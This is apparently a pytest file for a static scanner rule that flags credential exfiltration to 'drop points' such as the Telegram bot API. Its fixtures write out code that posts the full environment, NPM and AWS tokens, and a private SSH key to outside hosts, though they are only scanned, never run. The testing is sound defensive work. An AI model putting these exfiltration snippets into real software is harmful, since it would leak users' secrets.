"""What a request to a drop point carries: a setting the file configures itself with is not loot.

`LegitimateUse.a_setting`. Hosts are the real drop points the rule exists for; the fixtures
send nothing anywhere -- they are scanned, never run.
"""

from __future__ import annotations

from typing import ClassVar

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

RULE = "SUSPECT.EXFIL.DROP_POINT.001"


class DropPointKit:
    @staticmethod
    def fires(tmp_path, source: str) -> bool:
        (tmp_path / "notify.py").write_text(source, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)

    @staticmethod
    def notifier(reads: str) -> str:
        return (
            "import os, requests\n"
            f"value = {reads}\n"
            "def notify(text):\n"
            "    requests.post(\n"
            '        "https://api.telegram.org/bot%s/sendMessage" % os.getenv("TG_TOKEN"),\n'
            '        json={"chat_id": os.getenv("TG_CHAT"), "text": text, "v": str(value)},\n'
            "    )\n"
        )


class TestSettings:
    def test_a_notifier_reading_its_own_bot_token_is_quiet(self, tmp_path) -> None:
        assert not DropPointKit.fires(tmp_path, DropPointKit.notifier('os.getenv("TG_MODE")'))

    def test_the_architecture_is_not_who_the_machine_is(self, tmp_path) -> None:
        source = DropPointKit.notifier("platform.machine()").replace(
            "import os, requests", "import os, platform, requests"
        )
        assert not DropPointKit.fires(tmp_path, source)


class TestLoot:
    @pytest.mark.parametrize(
        "reads",
        [
            "dict(os.environ)",
            '__import__("getpass").getuser() + __import__("socket").gethostname()',
            'os.getenv("NPM_TOKEN")',
            'os.environ.get("AWS_SECRET_ACCESS_KEY")',
        ],
    )
    def test_identity_the_environment_or_another_services_credential_fires(
        self, tmp_path, reads
    ) -> None:
        assert DropPointKit.fires(tmp_path, DropPointKit.notifier(reads))


class StoreKit:
    @staticmethod
    def findings(tmp_path, source: str) -> set[str]:
        (tmp_path / "tool.py").write_text(source, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {f.rule_id for f in result.findings if "CREDENTIAL_STORE" in f.rule_id}


class TestAStoreReadByItsOwnClient:
    """`LegitimateUse.store_used_by_its_own_client`."""

    SSH_DEPLOY = (
        "import os, paramiko\n"
        'key = os.path.expanduser("~/.ssh/id_ed25519")\n'
        "def deploy(host):\n"
        "    ssh = paramiko.SSHClient()\n"
        "    ssh.connect(host, key_filename=key)\n"
    )

    def test_an_ssh_key_loaded_into_an_ssh_client_is_authentication(self, tmp_path) -> None:
        assert not StoreKit.findings(tmp_path, self.SSH_DEPLOY)

    def test_the_same_key_posted_over_http_is_not(self, tmp_path) -> None:
        source = self.SSH_DEPLOY + (
            "import requests\n"
            "def share():\n"
            '    requests.post("https://collector.example.invalid/k", data=open(key).read())\n'
        )
        assert StoreKit.findings(tmp_path, source)


class OtherLanguageKit:
    """A notifier in a language other than Python: one file, scanned and never run."""

    #: language: (file name, the file around `{read}`, the read of an environment variable `{name}` by its literal name).
    NOTIFIERS: ClassVar[dict[str, tuple[str, str, str]]] = {
        "rust": (
            "main.rs",
            'fn main() {{ let url = format!("https://api.telegram.org/bot{{}}/getUpdates", {read}); let _ = reqwest::blocking::get(url); }}',
            'std::env::var("{name}").unwrap_or_default()',
        ),
        "csharp": (
            "Bot.cs",
            'using System.Net.Http;\nclass Bot {{ static async System.Threading.Tasks.Task Main() {{ var url = "https://api.telegram.org/bot" + {read} + "/getUpdates"; await new HttpClient().GetAsync(url); }} }}',
            'System.Environment.GetEnvironmentVariable("{name}")',
        ),
        "go": (
            "main.go",
            'package main\nimport ("net/http";"os";"fmt")\nfunc main() {{ u := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates", {read}); http.Get(u) }}',
            'os.Getenv("{name}")',
        ),
        "java": (
            "Bot.java",
            'public class Bot {{ public static void main(String[] a) throws Exception {{ String url = "https://api.telegram.org/bot" + {read} + "/getUpdates"; new java.net.URL(url).openStream(); }} }}',
            'System.getenv("{name}")',
        ),
        "javascript": (
            "index.js",
            "const url = `https://api.telegram.org/bot${{{read}}}/getUpdates`; fetch(url).then(r => r.json());",
            "process.env.{name}",
        ),
        "ruby": (
            "bot.rb",
            'require "net/http"\nurl = "https://api.telegram.org/bot#{{{read}}}/getUpdates"\nNet::HTTP.get(URI(url))',
            'ENV["{name}"]',
        ),
        "php": (
            "bot.php",
            '<?php $url = "https://api.telegram.org/bot" . {read} . "/getUpdates"; file_get_contents($url);',
            'getenv("{name}")',
        ),
    }

    @classmethod
    def source(cls, language: str, name: str) -> tuple[str, str]:
        filename, shape, read = cls.NOTIFIERS[language]
        return filename, shape.format(read=read.format(name=name))

    @staticmethod
    def fires(tmp_path, filename: str, source: str) -> bool:
        (tmp_path / filename).write_text(source, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)


class TestANamedSettingInAnyLanguage:
    """A named setting that is not another service's credential is not loot, in every language: the read's name
    is the literal after the call's opening quote, which the hit's own text may stop before (`std::env::var("`)."""

    @pytest.mark.parametrize("language", sorted(OtherLanguageKit.NOTIFIERS))
    def test_a_notifier_reading_its_own_bot_token_by_name_is_quiet(self, tmp_path, language) -> None:
        filename, source = OtherLanguageKit.source(language, "BOT_TOKEN")
        assert not OtherLanguageKit.fires(tmp_path, filename, source)

    @pytest.mark.parametrize("language", ["rust", "csharp"])
    def test_the_same_notifier_reading_another_services_credential_fires(
        self, tmp_path, language
    ) -> None:
        filename, source = OtherLanguageKit.source(language, "GITHUB_TOKEN")
        assert OtherLanguageKit.fires(tmp_path, filename, source)

    def test_a_rust_notifier_that_also_sends_the_whole_environment_fires(self, tmp_path) -> None:
        source = (
            "fn main() { let env: Vec<(String,String)> = std::env::vars().collect(); "
            'let url = format!("https://api.telegram.org/bot{}/sendMessage?text={:?}", '
            'std::env::var("BOT_TOKEN").unwrap_or_default(), env); let _ = reqwest::blocking::get(url); }'
        )
        assert OtherLanguageKit.fires(tmp_path, "main.rs", source)

    def test_a_rust_notifier_that_also_reads_a_second_services_credential_fires(self, tmp_path) -> None:
        """The bot URL takes its token from a variable, but the same statement carries another service's credential."""
        source = (
            'fn main() { let url = format!("https://api.telegram.org/bot{}/sendMessage?text={}", '
            'std::env::var("BOT_TOKEN").unwrap_or_default(), std::env::var("NPM_TOKEN").unwrap_or_default()); '
            "let _ = reqwest::blocking::get(url); }"
        )
        assert OtherLanguageKit.fires(tmp_path, "main.rs", source)
